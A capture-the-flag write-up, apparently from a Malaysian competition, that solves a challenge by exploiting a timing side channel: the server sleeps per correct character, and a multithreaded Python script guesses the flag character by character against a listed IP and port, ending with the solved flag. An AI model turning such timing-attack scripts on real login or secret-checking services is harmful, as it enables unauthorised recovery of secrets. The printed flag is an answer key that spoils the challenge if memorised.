# Berenang Ke Tepian 🔧
## Description
> Berakit, berakitlah ke hulu Berenang, berenangku ke tepian Bersakit, biar kusakit dahulu Bersenang denganmu kemudian
> 
> Kelip-kelip kusangkakan api Sinar matahari membawa cahaya Kau hilang ghaib, sangkaku kaubenci Kiranya sengaja nak menduga
> 
> Connection 1: nc 103.28.91.24 10021
> 
> Connection 2: nc 103.28.91.24 10025
## Challenge Overview

`retrieve_flag` function checks if the input string matches the flag. It compares each character and returns 1 if the full string is correct, or 0 if incorrect. It also sleeps for 100,000 microseconds (0.1 seconds) between comparisons.

The `main` function reads a password from the user, checks it using `retrieve_flag()`, and prints whether the flag is correct or not. 

The challenge wants us to discover a flag by exploiting a timing-based side channel in a server response. The server takes different amounts of time to respond based on the validity of the input, allowing you to deduce correct characters of the flag by measuring these response times.

## Solution
```py
import time
import socket
import threading
from collections import defaultdict

# Connection function
def connect_to_server():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("103.28.91.24", 10025))
    return s

# Measure time function
def measure_time(s, guess):
    s.recv(1024)  # Ensure we're starting with fresh communication
    start_time = time.time()
    s.sendall(guess.encode())
    response = s.recv(1024)
    end_time = time.time()
    return end_time - start_time, response

# Test character function
def test_char(char, flag, result_dict, index):
    guess = flag + char
    s = connect_to_server()
    duration, _ = measure_time(s, guess)
    s.close()
    
    # Check if the guess is correct based on response duration
    is_correct = duration > 0.1 * len(guess)
    result_dict[index] = (char, is_correct, duration)

# Find flag function
def find_flag():
    flag = "3108{s"
    allowed_chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}_"
    
    while True:
        threads = []
        result_dict = {}
        
        # Create and start threads for each character
        for index, char in enumerate(allowed_chars):
            thread = threading.Thread(target=test_char, args=(char, flag, result_dict, index))
            thread.start()
            threads.append(thread)
        
        # Wait for all threads to finish
        for thread in threads:
            thread.join()
        
        # Process results
        found = False
        for char, is_correct, duration in sorted(result_dict.values(), key=lambda x: x[1], reverse=True):
            if is_correct:
                flag += char
                found = True
                print(f"Updated flag: {flag}")
                break  # Move to the next character after finding a valid one
        
        if not found:
            print("No valid character found in this pass. Exiting...")
            break  # Exit if no valid characters were found in a complete pass
    
    return flag

if __name__ == "__main__":
    start_time = time.time()
    flag = find_flag()
    end_time = time.time()
    print(f"Flag found: {flag}")
    print(f"Total time taken: {end_time - start_time:.2f} seconds")
```
### Explanation 
1. `measure_time()`: Measures the time taken by the server to respond to a guess. 
2. `test_char()`: Tests whether a particular character is valid by appending it to the current flag and measuring the response time. It then stores the result, including the character, its validity, and response duration, in a shared dictionary.
3. Validity Check: Determines if a character is correct based on whether the response time:
    -  True: `duration > 0.1 * len(guess)`
    -  False: `duration < 0.1 * len(guess)`
4. Flag Update: If a valid character is found, it's added to the current flag, and the process repeats to find the next character. The script continues until no valid characters are found in a complete pass.

## Flag
```
3108{s1mpl3_p3ngundur4n}
```
